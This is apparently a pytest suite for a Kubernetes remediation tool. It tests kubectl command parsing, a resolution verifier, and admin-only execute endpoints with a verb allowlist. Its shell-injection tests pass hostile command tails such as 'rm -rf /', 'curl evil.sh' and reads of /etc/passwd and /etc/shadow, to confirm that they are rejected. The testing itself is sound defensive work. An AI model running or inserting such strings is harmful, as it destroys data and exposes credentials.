"""
tests/test_resolve_verify.py — backs the Detect→Diagnose→**Resolve→Verify**
loop landed in v1.0. Covers three surfaces:

    TestParseProposedCommand  — pulls the kubectl line out of free-text
                                remediation, across the formats the AI
                                actually emits (fenced, inline, prose).
    TestVerifyResolution      — reason-specific verifier state machine:
                                injected clock + sleep so polls are
                                deterministic and fast in CI.
    TestExecuteEndpoint       — POST /api/v1/events/<id>/execute end-to-end:
                                admin-only, allowlisted verbs, snapshot
                                rows persisted, event auto-resolves on
                                a successful verify.

Every test that reloads ui.web uses the same mock bag as test_sec7_features
so we never spin up real LLMs / pool the SQLite that lives outside tmp_path.
"""
from __future__ import annotations

import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from monitor.verify import (
    parse_proposed_command,
    verify_resolution,
    VerificationResult,
)


# ── TestParseProposedCommand ────────────────────────────────────────────────

class TestParseProposedCommand:
    def test_returns_none_on_empty(self):
        assert parse_proposed_command("") is None
        assert parse_proposed_command(None) is None  # type: ignore[arg-type]

    def test_returns_none_when_no_kubectl_line(self):
        assert parse_proposed_command("Restart the pod and check logs.") is None

    def test_extracts_from_fenced_code_block(self):
        text = (
            "Root cause: image pull failure.\n\n"
            "```bash\n"
            "kubectl scale deployment/api --replicas=3\n"
            "```\n"
        )
        assert parse_proposed_command(text) == "kubectl scale deployment/api --replicas=3"

    def test_extracts_from_inline_backticks(self):
        text = "Run `kubectl rollout restart deployment/api` to recover."
        # Our parser walks lines, not inline — inline-only mentions
        # aren't extracted. Assert the documented shape: line must
        # start with `kubectl ` (after optional backticks / prompt chars).
        assert parse_proposed_command(text) is None

    def test_extracts_line_starting_with_backtick(self):
        text = "`kubectl delete pod crashloop -n demo`"
        assert parse_proposed_command(text) == "kubectl delete pod crashloop -n demo"

    def test_strips_shell_prompt_prefixes(self):
        for prompt in ("$ ", "# ", "> "):
            text = f"{prompt}kubectl apply -f fix.yaml"
            assert parse_proposed_command(text) == "kubectl apply -f fix.yaml"

    def test_picks_first_kubectl_when_multiple(self):
        text = (
            "First reschedule:\n"
            "kubectl cordon node-3\n"
            "Then drain:\n"
            "kubectl drain node-3 --ignore-daemonsets\n"
        )
        assert parse_proposed_command(text) == "kubectl cordon node-3"


# ── Verifier helpers ────────────────────────────────────────────────────────

class _VirtualClock:
    """Injectable clock + sleep. `sleep(dt)` just advances the simulated
    time — no real wall-clock wait. Lets the verifier's 60s timeout and
    15s stability window run in milliseconds of test time."""

    def __init__(self):
        self.now = 0.0

    def time(self) -> float:
        return self.now

    def sleep(self, dt: float) -> None:
        self.now += dt


class _ScriptedExecutor:
    """Returns a queue of outputs per-probe-substring. Each call pops
    the next response; reusing the last one if the queue is exhausted
    so a 'steady-state' probe can return the same value forever."""

    def __init__(self, script: dict[str, list[str]]):
        self._script = {k: list(v) for k, v in script.items()}
        self.calls:  list[str] = []

    def __call__(self, cmd: str) -> str:
        self.calls.append(cmd)
        for needle, outs in self._script.items():
            if needle in cmd:
                if len(outs) > 1:
                    return outs.pop(0)
                return outs[0] if outs else ""
        return ""


# ── TestVerifyResolution ────────────────────────────────────────────────────

class TestVerifyResolution:
    def test_pod_crashloop_recovers_to_running_steady(self):
        """CrashLoopBackOff verifier: pod must reach Running AND the
        restart count must not increment across polls. Steady-state
        'Running|4' for the full stability window → success."""
        clk = _VirtualClock()
        exec_fn = _ScriptedExecutor({
            "get pod crashloop": ["Running|4"],   # steady from first poll
        })
        event = {"reason": "CrashLoopBackOff", "object": "pod/crashloop",
                 "namespace": "demo"}

        r = verify_resolution(
            exec_fn, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is True
        assert r.reason == "pod-running"
        assert r.final_state == "Running|4"
        assert len(r.attempts) >= 2

    def test_pod_crashloop_restart_climbing_fails(self):
        """Restart count climbing between polls → still in a crash
        loop. Verifier must not accept this as healthy even though
        .status.phase keeps flipping to Running."""
        clk = _VirtualClock()
        # Phase stays Running, restart count climbs every poll → never
        # passes the stability gate; must time out.
        exec_fn = _ScriptedExecutor({
            "get pod loop": ["Running|1", "Running|2", "Running|3",
                             "Running|4", "Running|5", "Running|6",
                             "Running|7", "Running|8", "Running|9",
                             "Running|10", "Running|11", "Running|12"],
        })
        event = {"reason": "CrashLoopBackOff", "object": "pod/loop",
                 "namespace": "demo"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is False
        assert "timed out" in r.note

    def test_failed_scheduling_recovers_when_node_assigned(self):
        clk = _VirtualClock()
        exec_fn = _ScriptedExecutor({
            "get pod unscheduled": [
                "", "", "node-7", "node-7", "node-7", "node-7",
            ],
        })
        event = {"reason": "FailedScheduling", "object": "pod/unscheduled",
                 "namespace": "demo"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is True
        assert r.reason == "pod-scheduled"
        assert "node-7" in r.final_state

    def test_image_pull_ready_after_fix(self):
        clk = _VirtualClock()
        # First poll: one container still false. Later: both ready.
        exec_fn = _ScriptedExecutor({
            "get pod imgfix": ["false true ", "true true ", "true true "],
        })
        event = {"reason": "ImagePullBackOff", "object": "pod/imgfix",
                 "namespace": "demo"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is True
        assert r.reason == "pod-ready"

    def test_node_not_ready_with_pressure_blocks(self):
        """Node flips Ready=True but DiskPressure=True still → verifier
        must not declare healthy. A node with DiskPressure will shed
        pods and we haven't actually fixed it."""
        clk = _VirtualClock()
        # Even after "recovery", disk pressure stays → never healthy.
        exec_fn = _ScriptedExecutor({
            "get node n7": [
                "Ready=True Mem=False Disk=True PID=False",
            ],
        })
        event = {"reason": "NodeNotReady", "object": "node/n7"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is False

    def test_timeout_preserves_attempts_for_ui(self):
        """On timeout we still return the poll history so the UI's
        Verifying pane shows the operator what the object actually
        reported — the failure story is more useful than just 'gave up'."""
        clk = _VirtualClock()
        exec_fn = _ScriptedExecutor({"get pod stuck": ["Pending|0"]})
        event = {"reason": "CrashLoopBackOff", "object": "pod/stuck",
                 "namespace": "demo"}
        r = verify_resolution(
            exec_fn, event,
            timeout_s=10, poll_interval_s=5, stability_window_s=5,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is False
        assert r.attempts, "must return attempts even on timeout"
        assert r.duration_s >= 10

    def test_executor_exception_does_not_crash_verifier(self):
        """If kubectl throws mid-run (API server blip, auth token flap),
        the verifier must treat that poll as 'not yet healthy' and
        retry next interval — not bubble the exception out as an HTTP 500
        and drop the whole drill."""
        clk = _VirtualClock()
        calls = {"n": 0}

        def flaky(_cmd: str) -> str:
            calls["n"] += 1
            if calls["n"] < 3:
                raise RuntimeError("api server unavailable")
            return "Running|0"

        event = {"reason": "CrashLoopBackOff", "object": "pod/transient",
                 "namespace": "demo"}
        r = verify_resolution(
            flaky, event,
            timeout_s=60, poll_interval_s=5, stability_window_s=15,
            sleep_fn=clk.sleep, clock_fn=clk.time,
        )
        assert r.success is True
        assert calls["n"] > 3


# ── TestExecuteEndpoint ─────────────────────────────────────────────────────
#
# End-to-end coverage of POST /api/v1/events/<id>/execute. We stand up a
# minimal Flask app with the real EventStore (tmp SQLite) and mocked
# ToolExecutor / TargetManager, so the route exercises verification +
# snapshot persistence + audit middleware through real code paths.

def _isolated_data_dir(monkeypatch, tmp_path):
    monkeypatch.setenv("AZIRO_DATA_DIR", str(tmp_path))
    for key in ("AZIRO_API_KEY", "AZIRO_ALLOWED_ORIGINS", "AZIRO_ENABLE_HSTS",
                "AZIRO_PROXY_HOPS", "AZIRO_AUTH_MODE", "AZIRO_SESSION_SECRET",
                "AZIRO_BOOTSTRAP_ADMIN_USER", "AZIRO_BOOTSTRAP_ADMIN_PASSWORD"):
        monkeypatch.delenv(key, raising=False)
    for key in list(os.environ):
        if key.startswith("AZIRO_FEATURE_"):
            monkeypatch.delenv(key, raising=False)


def _reload_web():
    for name in ("ui.web", "auth", "auth.db", "auth.middleware", "auth.routes",
                 "config", "config.features"):
        sys.modules.pop(name, None)
    import ui.web as web
    web.app.config["TESTING"] = True
    return web, web.app.test_client()


@pytest.fixture
def app_with_execute(tmp_path, monkeypatch):
    """Flask app + test client with real EventStore (tmp SQLite) and a
    scripted ToolExecutor that captures the command(s) the route runs.

    Exposes via `web._tools.execute.side_effect` so each test can set
    its own executor script (or error-raise) without monkeypatching
    the route itself.
    """
    _isolated_data_dir(monkeypatch, tmp_path)
    monkeypatch.setenv("AZIRO_AUTH_MODE", "session")
    monkeypatch.setenv("AZIRO_SESSION_SECRET", "test-secret-please-ignore")
    monkeypatch.setenv("AZIRO_BCRYPT_ROUNDS", "4")

    # Keep verification fast. The endpoint uses default 60s/5s/15s but
    # under tests we want completion in <1s real time. verify.py uses
    # time.sleep which we can't inject from here without forking the
    # route, so clamp the defaults via env… except we don't expose that.
    # Instead: the scripted executor returns healthy immediately, and
    # we monkeypatch verify_resolution to use a no-op sleep in one
    # specific endpoint test below.

    with patch("providers.LLMClient"), \
         patch("tools.ToolExecutor") as MockTools, \
         patch("sessions.SessionManager") as MockSessions, \
         patch("targets.TargetManager") as MockTargets, \
         patch("agent.Agent"), \
         patch("agent.AgentSession"), \
         patch("store.metrics.MetricCollector"):
        MockTargets.return_value.get.return_value = {
            "id": "t1", "name": "demo-cluster",
            "type": "kubernetes", "config": {},
        }
        MockTargets.return_value.load_safe.return_value = []
        MockSessions.return_value.load.return_value = []
        # Default: executor returns "" for kubectl verify probes → verify
        # will time out. Individual tests override .side_effect.
        MockTools.return_value.execute.return_value = ""
        yield _reload_web()


def _login_admin(client, web):
    web._auth.create_user("alice", "correct-horse-battery", role="admin")
    r = client.post("/api/v1/auth/login",
                    json={"username": "alice", "password": "correct-horse-battery"})
    assert r.status_code == 200, r.get_json()


def _login_viewer(client, web):
    web._auth.create_user("viv", "correct-horse-battery", role="viewer")
    r = client.post("/api/v1/auth/login",
                    json={"username": "viv", "password": "correct-horse-battery"})
    assert r.status_code == 200, r.get_json()


def _seed_event(web) -> int:
    return web._store.save_event(
        {"source": "kubernetes", "type": "Warning", "reason": "CrashLoopBackOff",
         "object": "pod/crashloop", "namespace": "demo", "message": "x"},
        "SEV2",
        target_id="t1", target_name="demo-cluster",
    )


class TestExecuteEndpoint:
    def test_viewer_gets_403(self, app_with_execute):
        """Viewers can see events but must not execute remediations."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_viewer(c, web)
        r = c.post(f"/api/v1/events/{eid}/execute",
                   json={"command": "kubectl delete pod crashloop -n demo"})
        assert r.status_code == 403

    def test_unknown_event_404(self, app_with_execute):
        web, c = app_with_execute
        _login_admin(c, web)
        r = c.post("/api/v1/events/99999/execute",
                   json={"command": "kubectl delete pod x -n demo"})
        assert r.status_code == 404

    def test_empty_command_400(self, app_with_execute):
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)
        r = c.post(f"/api/v1/events/{eid}/execute", json={"command": ""})
        assert r.status_code == 400

    def test_non_kubectl_rejected(self, app_with_execute):
        """Anything that isn't `kubectl …` is rejected up-front. Keeps
        us out of the business of sandboxing arbitrary shell commands."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)
        r = c.post(f"/api/v1/events/{eid}/execute",
                   json={"command": "rm -rf /"})
        assert r.status_code == 400

    def test_disallowed_verb_rejected(self, app_with_execute):
        """`kubectl get`, `exec`, `port-forward` etc. are intentionally
        not on the allowlist. The error body should tell the operator
        what verbs ARE allowed so the UI can surface it."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)
        r = c.post(f"/api/v1/events/{eid}/execute",
                   json={"command": "kubectl get pod crashloop -n demo"})
        assert r.status_code == 400
        body = r.get_json()
        assert body["verb"] == "get"
        assert "apply" in body["allowed"]

    def test_skips_flags_when_extracting_verb(self, app_with_execute):
        """`kubectl -n demo apply -f …` must validate as `apply`, not `-n`.
        Real-world commands routinely front-load global flags."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        # Make executor return healthy immediately for the verify poll,
        # so we actually reach the 200 branch.
        web._tools.execute.side_effect = lambda _t, cmd: (
            "apply ok" if "apply" in cmd else "Running|0"
        )
        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(f"/api/v1/events/{eid}/execute",
                       json={"command": "kubectl -n demo apply -f fix.yaml"})
        assert r.status_code == 200, r.get_json()

    def test_set_image_allowed(self, app_with_execute):
        """Regression (v1.0 demo 2026-04-23): `kubectl set image` was
        rejected with `verb not allowed` because `set` was missing from
        the execute allowlist. `set` is the correct remediation for an
        ImagePullBackOff Deployment (patches spec atomically) — it must
        route through the Execute & Verify flow, not bounce."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        web._tools.execute.side_effect = lambda _t, cmd: (
            "image updated" if "set image" in cmd else "Running|0"
        )
        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(f"/api/v1/events/{eid}/execute",
                       json={"command":
                             "kubectl set image deployment/demo-store-worker "
                             "worker=nginx:latest -n demo"})
        assert r.status_code == 200, r.get_json()

    def test_replace_allowed(self, app_with_execute):
        """`kubectl replace -f` is the non-interactive twin of `apply`
        for full-object replacement. Same routing as `apply`."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        web._tools.execute.side_effect = lambda _t, cmd: (
            "replaced" if "replace" in cmd else "Running|0"
        )
        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(f"/api/v1/events/{eid}/execute",
                       json={"command": "kubectl replace -f fix.yaml"})
        assert r.status_code == 200, r.get_json()

    def test_happy_path_persists_snapshots_and_resolves(self, app_with_execute):
        """End-to-end:
          - POST executes the command (ToolExecutor.execute called once with it)
          - 'execution' snapshot row written with command + output
          - verify succeeds → 'verification' snapshot row written
          - event.status flips to 'resolved'
          - audit_log has the POST row with status=200 for the admin
        """
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        def fake_exec(_target, cmd: str) -> str:
            if cmd.startswith("kubectl delete "):
                return "pod \"crashloop\" deleted"
            if "get pod crashloop" in cmd:
                return "Running|0"   # steady-state healthy
            return ""

        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(f"/api/v1/events/{eid}/execute",
                       json={"command": "kubectl delete pod crashloop -n demo"})
        assert r.status_code == 200, r.get_json()
        body = r.get_json()
        assert body["final_status"] == "resolved"
        assert body["execution"]["command"] == "kubectl delete pod crashloop -n demo"
        assert body["verification"]["success"] is True

        # Snapshot rows persisted.
        event = web._store.get_event(eid)
        assert event["status"] == "resolved"
        kinds = sorted(s["kind"] for s in event["snapshots"])
        assert "execution" in kinds
        assert "verification" in kinds

        # Audit row for alice's POST is present with status 200.
        rows = web._auth.recent_audit(limit=20)
        match = [r for r in rows
                 if r["action"] == f"POST /api/v1/events/{eid}/execute"
                 and r["username"] == "alice"]
        assert match, "execute POST must be in audit_log"
        assert match[0]["status"] == 200

    def test_target_gone_returns_409(self, app_with_execute):
        """Event references a target that's since been deleted → we
        can't execute. 409 (conflict) is a better fit than 404 because
        the event itself still exists."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        # Targets now returns None → simulates target deleted since the
        # event was raised.
        web._targets.get.return_value = None

        r = c.post(f"/api/v1/events/{eid}/execute",
                   json={"command": "kubectl delete pod crashloop -n demo"})
        assert r.status_code == 409

    def test_verify_failure_keeps_event_open_with_trail(self, app_with_execute):
        """Execute succeeds but verify times out → event MUST stay open
        so the operator can retry. A 'needs_attention' response carries
        the verification attempts so the UI can render what went wrong."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        def fake_exec(_target, cmd: str) -> str:
            if cmd.startswith("kubectl delete"):
                return "pod \"crashloop\" deleted"
            # Verify polls → pod never reaches Running.
            if "get pod" in cmd:
                return "Pending|0"
            return ""

        web._tools.execute.side_effect = fake_exec

        # Clamp verify to a tight budget so the test finishes fast even
        # with real-time sleep patched out.
        from monitor import verify as verify_mod
        with patch("monitor.verify.time.sleep", lambda _s: None), \
             patch.object(verify_mod, "_DEFAULT_TIMEOUT_S", 5), \
             patch.object(verify_mod, "_DEFAULT_POLL_INTERVAL_S", 1), \
             patch.object(verify_mod, "_DEFAULT_STABILITY_S", 2):
            r = c.post(f"/api/v1/events/{eid}/execute",
                       json={"command": "kubectl delete pod crashloop -n demo"})
        assert r.status_code == 200
        body = r.get_json()
        assert body["final_status"] == "needs_attention"
        assert body["verification"]["success"] is False

        event = web._store.get_event(eid)
        assert event["status"] != "resolved", (
            "event must remain open so operator can retry"
        )
        # Both snapshot rows must still be written — the failure evidence
        # is exactly what the UI needs to render.
        kinds = sorted(s["kind"] for s in event["snapshots"])
        assert "execution" in kinds
        assert "verification" in kinds


# ── TestFindOrCreateEvent ──────────────────────────────────────────────────

class TestFindOrCreateEvent:
    """Store method powering the Dashboard-initiated Resolve flow. Reuse is
    what keeps the audit log from splitting: when the monitor has already
    filed an incident, the user's fix must land on that row."""

    def test_creates_when_no_match(self, app_with_execute):
        web, _c = app_with_execute
        ev = web._store.find_or_create_event(
            target_id="t1", target_name="demo-cluster",
            obj="pod/fresh", namespace="demo", reason="CrashLoopBackOff",
        )
        assert ev["id"] > 0
        assert ev["object"] == "pod/fresh"
        assert ev["status"] == "open"
        assert ev["source"] == "user-initiated"

    def test_reuses_open_event_for_same_object(self, app_with_execute):
        web, _c = app_with_execute
        eid = web._store.save_event(
            {"source": "kubernetes", "reason": "CrashLoopBackOff",
             "object": "pod/sticky", "namespace": "demo", "message": "caught"},
            "SEV2", target_id="t1", target_name="demo-cluster",
        )
        ev = web._store.find_or_create_event(
            target_id="t1", target_name="demo-cluster",
            obj="pod/sticky", namespace="demo", reason="UserInitiated",
        )
        assert ev["id"] == eid, "must reuse the open monitor-caught event"
        assert ev["source"] == "kubernetes", "original row fields preserved"

    def test_reuses_acknowledged_event(self, app_with_execute):
        """An acknowledged event is still an active incident — the user
        clicking Resolve should attach to it, not spawn a parallel row."""
        web, _c = app_with_execute
        eid = web._store.save_event(
            {"source": "kubernetes", "reason": "ImagePullBackOff",
             "object": "pod/ack", "namespace": "demo", "message": "ack'd"},
            "SEV2", target_id="t1", target_name="demo-cluster",
        )
        assert web._store.update_event_status(eid, "acknowledged") is True

        ev = web._store.find_or_create_event(
            target_id="t1", target_name="demo-cluster",
            obj="pod/ack", namespace="demo", reason="UserInitiated",
        )
        assert ev["id"] == eid

    def test_skips_resolved_event_and_creates_new(self, app_with_execute):
        """A resolved row is a closed chapter — a new user-initiated fix
        opens a fresh one rather than reopening the old trail."""
        web, _c = app_with_execute
        old = web._store.save_event(
            {"source": "kubernetes", "reason": "CrashLoopBackOff",
             "object": "pod/closed", "namespace": "demo", "message": "x"},
            "SEV2", target_id="t1", target_name="demo-cluster",
        )
        assert web._store.update_event_status(old, "resolved") is True

        ev = web._store.find_or_create_event(
            target_id="t1", target_name="demo-cluster",
            obj="pod/closed", namespace="demo", reason="UserInitiated",
        )
        assert ev["id"] != old
        assert ev["source"] == "user-initiated"

    def test_does_not_confuse_different_namespaces(self, app_with_execute):
        web, _c = app_with_execute
        eid_a = web._store.save_event(
            {"source": "kubernetes", "reason": "CrashLoopBackOff",
             "object": "pod/x", "namespace": "ns-a", "message": ""},
            "SEV2", target_id="t1", target_name="demo-cluster",
        )
        ev = web._store.find_or_create_event(
            target_id="t1", target_name="demo-cluster",
            obj="pod/x", namespace="ns-b", reason="UserInitiated",
        )
        assert ev["id"] != eid_a, "ns-b fix must not reuse ns-a's row"


# ── TestTargetExecuteResolveEndpoint ───────────────────────────────────────

class TestTargetExecuteResolveEndpoint:
    """POST /api/v1/targets/<tid>/execute-resolve — the Dashboard entry
    point. Shares validation + execute+verify internals with the
    event-scoped endpoint; these tests lock down the bits that differ:
    find-or-create, the body shape, and target lookup errors."""

    def test_viewer_gets_403(self, app_with_execute):
        web, c = app_with_execute
        _login_viewer(c, web)
        r = c.post("/api/v1/targets/t1/execute-resolve",
                   json={"object": "pod/x", "namespace": "demo",
                         "reason": "CrashLoopBackOff",
                         "command": "kubectl delete pod x -n demo"})
        assert r.status_code == 403

    def test_missing_target_returns_404(self, app_with_execute):
        web, c = app_with_execute
        _login_admin(c, web)
        web._targets.get.return_value = None
        r = c.post("/api/v1/targets/ghost/execute-resolve",
                   json={"object": "pod/x", "namespace": "demo",
                         "command": "kubectl delete pod x -n demo"})
        assert r.status_code == 404

    def test_missing_object_400(self, app_with_execute):
        web, c = app_with_execute
        _login_admin(c, web)
        r = c.post("/api/v1/targets/t1/execute-resolve",
                   json={"namespace": "demo",
                         "command": "kubectl delete pod x -n demo"})
        assert r.status_code == 400
        assert "object" in (r.get_json().get("error") or "").lower()

    def test_disallowed_verb_rejected(self, app_with_execute):
        web, c = app_with_execute
        _login_admin(c, web)
        r = c.post("/api/v1/targets/t1/execute-resolve",
                   json={"object": "pod/x", "namespace": "demo",
                         "command": "kubectl get pods"})
        assert r.status_code == 400
        body = r.get_json()
        assert body.get("verb") == "get"
        assert "apply" in body.get("allowed", [])

    def test_happy_path_creates_event_and_resolves(self, app_with_execute):
        """Dashboard-initiated fix for a pod the monitor has NOT caught:
           - a new event row is created (source=user-initiated)
           - execute + verify snapshots attach to it
           - event auto-resolves
           - response carries the new event_id for deep-linking
        """
        web, c = app_with_execute
        _login_admin(c, web)

        def fake_exec(_target, cmd: str) -> str:
            if cmd.startswith("kubectl delete "):
                return "pod \"dash-x\" deleted"
            if "get pod dash-x" in cmd:
                return "Running|0"
            return ""
        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post("/api/v1/targets/t1/execute-resolve",
                       json={"object": "pod/dash-x", "namespace": "demo",
                             "reason": "CrashLoopBackOff",
                             "command": "kubectl delete pod dash-x -n demo"})
        assert r.status_code == 200, r.get_json()
        body = r.get_json()
        assert body["final_status"] == "resolved"
        new_eid = body["event_id"]
        assert new_eid > 0

        event = web._store.get_event(new_eid)
        assert event["source"] == "user-initiated"
        assert event["object"] == "pod/dash-x"
        assert event["status"] == "resolved"
        kinds = sorted(s["kind"] for s in event["snapshots"])
        assert "execution" in kinds
        assert "verification" in kinds

    def test_reuses_monitor_event_when_present(self, app_with_execute):
        """When the monitor has already logged an incident for this pod,
        the user's Dashboard-initiated fix MUST land on that same row so
        the audit trail stays contiguous."""
        web, c = app_with_execute
        _login_admin(c, web)

        eid = web._store.save_event(
            {"source": "kubernetes", "reason": "CrashLoopBackOff",
             "object": "pod/monitored", "namespace": "demo", "message": "m"},
            "SEV2", target_id="t1", target_name="demo-cluster",
        )

        def fake_exec(_target, cmd: str) -> str:
            if cmd.startswith("kubectl delete "):
                return "pod \"monitored\" deleted"
            if "get pod monitored" in cmd:
                return "Running|0"
            return ""
        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post("/api/v1/targets/t1/execute-resolve",
                       json={"object": "pod/monitored", "namespace": "demo",
                             "reason": "CrashLoopBackOff",
                             "command": "kubectl delete pod monitored -n demo"})
        assert r.status_code == 200, r.get_json()
        body = r.get_json()
        assert body["event_id"] == eid
        event = web._store.get_event(eid)
        assert event["source"] == "kubernetes"
        assert event["status"] == "resolved"


# ── TestCodeRabbitFixes ────────────────────────────────────────────────────
#
# Regression coverage for the hardening pass that followed the first
# CodeRabbit review on PR #41. Each test pins one finding so a future
# refactor can't silently re-introduce the defect.


class TestShellMetacharRejection:
    """`_validate_kubectl_command` must reject any shell metacharacter
    that would let operator input escape `kubectl` and run arbitrary
    shell via tools/base.run_command's shell=True path."""

    @pytest.mark.parametrize("tail", [
        "; rm -rf /",
        " && curl evil.sh",
        " || echo pwned",
        " | cat /etc/passwd",
        " > /tmp/out",
        " < /etc/shadow",
        " `whoami`",
        " $(id)",
        "\nrm -rf /",
        # Brace expansion widens a single-target delete into many —
        # `kubectl delete pod web-{a,b,c}` touches three pods, not one.
        "{,-backup}",
        " {1..5}",
    ])
    def test_shell_metacharacters_rejected(self, app_with_execute, tail):
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)
        bad = f"kubectl delete pod x -n demo{tail}"
        r = c.post(f"/api/v1/events/{eid}/execute", json={"command": bad})
        assert r.status_code == 400, r.get_json()
        body = r.get_json()
        assert "shell metacharacters" in (body.get("error") or "").lower()

    def test_plain_command_passes_metachar_check(self, app_with_execute):
        """Without metacharacters the validator falls through to the
        existing verb allowlist, so a well-formed kubectl still works."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)
        web._tools.execute.side_effect = lambda _t, cmd: (
            "Running|0" if "get pod crashloop" in cmd else "pod deleted"
        )
        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(
                f"/api/v1/events/{eid}/execute",
                json={"command": "kubectl delete pod crashloop -n demo"},
            )
        assert r.status_code == 200, r.get_json()


class TestTargetNameOnDashboardResolve:
    """The Dashboard endpoint used `getattr(target, 'name', ...)` but
    TargetManager.get() returns a dict — so new user-initiated events
    inherited the id as their display name. History then rendered `t1`
    instead of `demo-cluster`, which is confusing in a multi-target UI."""

    def test_dashboard_resolve_uses_target_display_name(self, app_with_execute):
        web, c = app_with_execute
        _login_admin(c, web)

        def fake_exec(_target, cmd: str) -> str:
            if "get pod fresh" in cmd:
                return "Running|0"
            return "ok"
        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(
                "/api/v1/targets/t1/execute-resolve",
                json={"object": "pod/fresh", "namespace": "demo",
                      "reason": "CrashLoopBackOff",
                      "command": "kubectl delete pod fresh -n demo"},
            )
        assert r.status_code == 200, r.get_json()
        new_eid = r.get_json()["event_id"]
        event = web._store.get_event(new_eid)
        # Must come from target["name"], not fall back to the id.
        assert event["target_name"] == "demo-cluster"


class TestVerifierCrashFallbackShape:
    """When verify_resolution() throws, the JSON response must still
    carry the full VerificationResult.to_dict() shape — the frontend
    result panel reads reason/predicate/final_state unconditionally."""

    def test_fallback_matches_normal_shape(self, app_with_execute):
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        web._tools.execute.side_effect = lambda _t, _cmd: "pod deleted"

        def boom(*_a, **_kw):
            raise RuntimeError("verifier internals broke")

        with patch("ui.web.verify_resolution", side_effect=boom):
            r = c.post(
                f"/api/v1/events/{eid}/execute",
                json={"command": "kubectl delete pod crashloop -n demo"},
            )
        assert r.status_code == 200
        v = r.get_json()["verification"]
        # The contract the UI relies on:
        for k in ("success", "reason", "predicate",
                  "attempts", "duration_s", "final_state", "note"):
            assert k in v, f"missing field {k!r} in verifier-crash fallback"
        assert v["success"] is False
        assert "verifier crashed" in v["note"]


class TestDeletePodSelectorCapture:
    """delete-pod remediation must pivot from by-name polling to by-label
    polling — a ReplicaSet-owned pod is replaced with a new generated
    name, and the by-name probe would just time out on the old name."""

    def test_probes_by_selector_when_pod_has_template_hash(self, app_with_execute):
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        calls: list[str] = []

        def fake_exec(_target, cmd: str) -> str:
            calls.append(cmd)
            if "pod-template-hash" in cmd and ".metadata.labels" in cmd:
                # Capture phase: pod is ReplicaSet-owned.
                return "7c6d9f"
            if cmd.startswith("kubectl delete "):
                return "pod \"crashloop\" deleted"
            if "-l pod-template-hash=7c6d9f" in cmd:
                # Selector-based verification probe.
                return "Running|0"
            return ""

        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(
                f"/api/v1/events/{eid}/execute",
                json={"command": "kubectl delete pod crashloop -n demo"},
            )
        assert r.status_code == 200, r.get_json()
        body = r.get_json()
        assert body["final_status"] == "resolved"
        # Verifier actually used the selector path — we'd never reach
        # this without the by-label probe firing.
        assert any("-l pod-template-hash=7c6d9f" in c for c in calls), (
            "verifier must have used the label-selector probe"
        )

    def test_invalid_hash_output_falls_back_to_by_name(self, app_with_execute):
        """When the capture probe returns noise (executor error string,
        truncated output, garbage), we must NOT build a corrupt selector
        — the validator requires a real pod-template-hash shape."""
        web, c = app_with_execute
        eid = _seed_event(web)
        _login_admin(c, web)

        calls: list[str] = []

        def fake_exec(_target, cmd: str) -> str:
            calls.append(cmd)
            if "pod-template-hash" in cmd and ".metadata.labels" in cmd:
                # Garbage capture output — must be discarded, not used.
                return "Error from server (NotFound): pods \"crashloop\" not found"
            if cmd.startswith("kubectl delete "):
                return "pod deleted"
            if "get pod crashloop" in cmd:
                return "Running|0"
            return ""

        web._tools.execute.side_effect = fake_exec

        with patch("monitor.verify.time.sleep", lambda _s: None):
            r = c.post(
                f"/api/v1/events/{eid}/execute",
                json={"command": "kubectl delete pod crashloop -n demo"},
            )
        assert r.status_code == 200, r.get_json()
        # Must have reverted to the by-name probe, not used the garbage
        # string as a selector.
        assert not any("-l " in c for c in calls), (
            "invalid hash must disable selector path"
        )


class TestNodeAdditionalConditions:
    """_NODE_REASONS routes NetworkUnavailable and OutOfDisk through
    _probe_node_ready / _is_healthy_node. The probe+predicate must
    actually observe those conditions — otherwise the verifier flips
    to success the moment Ready returns True, even with the offending
    condition still asserted."""

